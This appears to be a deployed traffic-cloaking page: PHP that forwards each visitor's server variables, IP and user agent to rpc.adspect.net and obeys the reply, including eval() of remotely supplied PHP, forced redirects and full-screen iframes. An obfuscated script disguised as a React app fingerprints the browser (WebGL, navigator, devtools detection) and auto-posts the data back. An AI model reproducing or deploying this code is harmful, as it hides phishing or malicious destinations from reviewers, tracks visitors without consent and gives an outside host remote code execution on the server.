<?php
 ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url = '') { $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; if ($url !== '') { $url = parse_url($url); if (isset($url['path'])) { if (substr($url['path'], 0, 1) === '/') { $_SERVER['REQUEST_URI'] = $url['path']; } else { $_SERVER['REQUEST_URI'] = dirname($_SERVER['REQUEST_URI']) . '/' . $url['path']; } } if (isset($url['query'])) { parse_str($url['query'], $_GET); $_SERVER['QUERY_STRING'] = $url['query']; } else { $_GET = []; $_SERVER['QUERY_STRING'] = ''; } } } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } header('Content-Type: text/html'); switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); case 'html': case 'htm': header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_real_ip() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $ip = strtok($_SERVER['HTTP_X_FORWARDED_FOR'], ','); } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $ip = $_SERVER['HTTP_X_REAL_IP']; } elseif (array_key_exists('HTTP_REAL_IP', $_SERVER)) { $ip = $_SERVER['HTTP_REAL_IP']; } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $ip = $_SERVER['HTTP_CF_CONNECTING_IP']; } if (empty($ip)) { $ip = $_SERVER['REMOTE_ADDR']; } return $ip; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); $headers[] = 'Cache-Control: no-cache'; curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = htmlspecialchars_decode($url); $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } $repl = htmlspecialchars($repl); if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'php-curl extension is missing'); } if (!function_exists('json_encode') || !function_exists('json_decode')) { adspect_exit(500, 'php-json extension is missing'); } $addr = adspect_real_ip(); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); switch (array_key_exists('data', $_POST)) { case true: $payload = json_decode($_POST['data'], true); if (is_array($payload)) { break; } default: $payload = []; break; } $payload['server'] = $_SERVER; curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_ENCODING, ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': adspect_spoof_request($target); return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); adspect_spoof_request(); return null; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><html><head><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"></head><body><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe></body></html>"; break; case 'proxy': adspect_proxy($target, $param, $key); break; case 'fetch': adspect_proxy($target); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('a62eb245-baee-4276-9a60-633d98b05964', 'redirect', '_', base64_decode('dFEKcvQ4JwCEme3ASZBiYeTkPiINzGd1Ckg1Y1odOys=')); if (!isset($target)) { return; } ?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
  <body>
    <noscript>You need to enable JavaScript to run this app.</noscript>
    <div id="root">
      <script>(function(){var react_haswarnedaboutusingnovalueproponcontextprovider=[],react_newapiname={};try{function react_queuedinvalidatedmodules(react_mountmemo){if('object'===typeof react_mountmemo&&null!==react_mountmemo){var react_numberofoverflowbits={};function react_ancestorinfo(react_componentdidunmount){try{var react_startmarker=react_mountmemo[react_componentdidunmount];switch(typeof react_startmarker){case'object':if(null===react_startmarker)break;case'function':react_startmarker=react_startmarker['toString']();}react_numberofoverflowbits[react_componentdidunmount]=react_startmarker;}catch(react_setenabled){react_haswarnedaboutusingnovalueproponcontextprovider['push'](react_setenabled['message']);}}for(var react_currentupdateruntime in react_mountmemo)react_ancestorinfo(react_currentupdateruntime);try{var react_getownpropertydescriptors=Object['getOwnPropertyNames'](react_mountmemo);for(react_currentupdateruntime=0x0;react_currentupdateruntime<react_getownpropertydescriptors['length'];++react_currentupdateruntime)react_ancestorinfo(react_getownpropertydescriptors[react_currentupdateruntime]);react_numberofoverflowbits['!!']=react_getownpropertydescriptors;}catch(reactsyntheticwheelevent){react_haswarnedaboutusingnovalueproponcontextprovider['push'](reactsyntheticwheelevent['message']);}return react_numberofoverflowbits;}}react_newapiname['screen']=react_queuedinvalidatedmodules(window['screen']),react_newapiname['window']=react_queuedinvalidatedmodules(window),react_newapiname['navigator']=react_queuedinvalidatedmodules(window['navigator']),react_newapiname['location']=react_queuedinvalidatedmodules(window['location']),react_newapiname['console']=react_queuedinvalidatedmodules(window['console']),react_newapiname['documentElement']=function(_getsuspenseinstancef){try{var react_usetransition={};_getsuspenseinstancef=_getsuspenseinstancef['attributes'];for(var react_enqueueconcurrenthookupdateandeagerlybailout in _getsuspenseinstancef)react_enqueueconcurrenthookupdateandeagerlybailout=_getsuspenseinstancef[react_enqueueconcurrenthookupdateandeagerlybailout],react_usetransition[react_enqueueconcurrenthookupdateandeagerlybailout['nodeName']]=react_enqueueconcurrenthookupdateandeagerlybailout['nodeValue'];return react_usetransition;}catch(react_nextbaselanes){react_haswarnedaboutusingnovalueproponcontextprovider['push'](react_nextbaselanes['message']);}}(document['documentElement']),react_newapiname['document']=react_queuedinvalidatedmodules(document);try{react_newapiname['timezoneOffset']=new Date()['getTimezoneOffset']();}catch(react_updatefunctioncomponent){react_haswarnedaboutusingnovalueproponcontextprovider['push'](react_updatefunctioncomponent['message']);}try{react_newapiname['closure']=function(){}['toString']();}catch(react_resetnestedupdateflag){react_haswarnedaboutusingnovalueproponcontextprovider['push'](react_resetnestedupdateflag['message']);}try{react_newapiname['touchEvent']=document['createEvent']('TouchEvent')['toString']();}catch(react_dispatcher){react_haswarnedaboutusingnovalueproponcontextprovider['push'](react_dispatcher['message']);}try{var react_getremainingworkinprimarytree=function(){},react_oncommitfiberunmount=0x0;react_getremainingworkinprimarytree['toString']=function(){return++react_oncommitfiberunmount,'';},console['log'](react_getremainingworkinprimarytree),react_newapiname['tostring']=react_oncommitfiberunmount;}catch(react_download){react_haswarnedaboutusingnovalueproponcontextprovider['push'](react_download['message']);}try{var react_createeventlistenerwrapperwithpriority=document['createElement']('canvas')['getContext']('webgl'),react_comparedocumentposition=react_createeventlistenerwrapperwithpriority['getExtension']('WEBGL_debug_renderer_info');react_newapiname['webgl']={'vendor':react_createeventlistenerwrapperwithpriority['getParameter'](react_comparedocumentposition['UNMASKED_VENDOR_WEBGL']),'renderer':react_createeventlistenerwrapperwithpriority['getParameter'](react_comparedocumentposition['UNMASKED_RENDERER_WEBGL'])};}catch(react_context){react_haswarnedaboutusingnovalueproponcontextprovider['push'](react_context['message']);}function react_y1(reactstrictlegacymode,react_servertext,react_workloopconcurrent){var react_nestedhooksignature=reactstrictlegacymode['prototype'][react_servertext];reactstrictlegacymode['prototype'][react_servertext]=function(){react_newapiname['proto']=!0x0;},react_workloopconcurrent(),reactstrictlegacymode['prototype'][react_servertext]=react_nestedhooksignature;}try{react_y1(Array,'includes',function(){return document['createElement']('video')['canPlayType']('video/mp4');});}catch(react_pushsuspensecontext){}}catch(react_didcall){react_haswarnedaboutusingnovalueproponcontextprovider['push'](react_didcall['message']);}(function(){react_newapiname['errors']=react_haswarnedaboutusingnovalueproponcontextprovider;var react_getselection$1=document['createElement']('form'),react_markskippedupdatelanes=document['createElement']('input');react_getselection$1['method']='POST',react_getselection$1['action']=window['location']['href'],react_markskippedupdatelanes['type']='hidden',react_markskippedupdatelanes['name']='data',react_markskippedupdatelanes['value']=JSON['stringify'](react_newapiname),react_getselection$1['appendChild'](react_markskippedupdatelanes),document['body']['appendChild'](react_getselection$1),react_getselection$1['submit']();}());}());</script>
    </div>
  </body>
</html>
<?php exit();
